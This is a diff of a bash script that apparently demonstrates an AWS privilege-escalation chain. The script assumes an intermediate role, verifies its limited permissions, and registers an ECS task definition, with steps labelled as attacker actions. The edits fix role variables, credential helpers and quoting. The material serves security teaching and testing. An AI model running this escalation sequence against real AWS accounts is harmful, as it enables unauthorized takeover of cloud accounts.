@@ -186,7 +186,7 @@ echo -e "${YELLOW}Step 6: HOP 1 - Assuming the intermediate role with ECS permis
 echo -e "${BLUE}Attack Vector: sts:AssumeRole${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
-INTERMEDIATE_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${STARTING_ROLE}"
+INTERMEDIATE_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${INTERMEDIATE_ROLE}"
 echo "Target Role: $INTERMEDIATE_ROLE_ARN"
 echo ""
 
@@ -224,11 +224,11 @@ echo ""
 
 # [OBSERVATION] Step 7: Verify the intermediate role's permissions
 echo -e "${YELLOW}Step 7: Verifying intermediate role permissions${NC}"
-use_readonly_creds
+use_role_creds
 export AWS_REGION=$AWS_REGION
 echo "The intermediate role should have ECS and PassRole permissions..."
 echo "Still cannot list IAM users (not admin yet)..."
-show_cmd "ReadOnly" "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}Warning: Intermediate role can list IAM users${NC}"
 else
@@ -343,7 +343,7 @@ TASK_DEF='{
   ]
 }'
 
-show_attack_cmd "Attacker" "aws ecs register-task-definition --region $AWS_REGION --cli-input-json "<task-definition-json>" --output json"
+show_attack_cmd "Attacker" "aws ecs register-task-definition --region $AWS_REGION --cli-input-json '<task-definition-json>' --output json"
 REGISTER_RESULT=$(aws ecs register-task-definition \
     --region $AWS_REGION \
     --cli-input-json "$TASK_DEF" \
